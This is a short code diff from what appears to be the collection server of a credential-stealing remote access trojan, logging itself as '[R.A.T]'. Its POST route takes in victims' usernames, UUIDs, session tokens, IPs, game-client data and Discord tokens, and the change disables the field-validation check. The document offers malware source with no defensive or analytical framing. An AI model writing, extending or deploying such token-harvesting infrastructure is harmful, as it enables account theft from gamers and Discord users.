@@ -42,10 +42,10 @@ setInterval(() => {
 //main route, post to this
 app.post("/", (req, res) => {
     //happens if the request does not contain all the required fields, aka someones manually posting to the server
-    if (!["username", "uuid", "token", "ip", "feather", "essentials", "discord"].every(field => req.body.hasOwnProperty(field))) {
+    /*if (!["username", "uuid", "token", "ip", "feather", "essentials", "discord"].every(field => req.body.hasOwnProperty(field))) {
         console.log("[R.A.T] Rejected malformed JSON")
         return res.sendStatus(404)
-    }
+    }*/
 
     //check if ip exists, if not then create a new entry, if yes then increment that entry
     if (!ipMap.find(entry => entry[0] == req.ipInfo.ip)) ipMap.push([req.ipInfo.ip, 1])
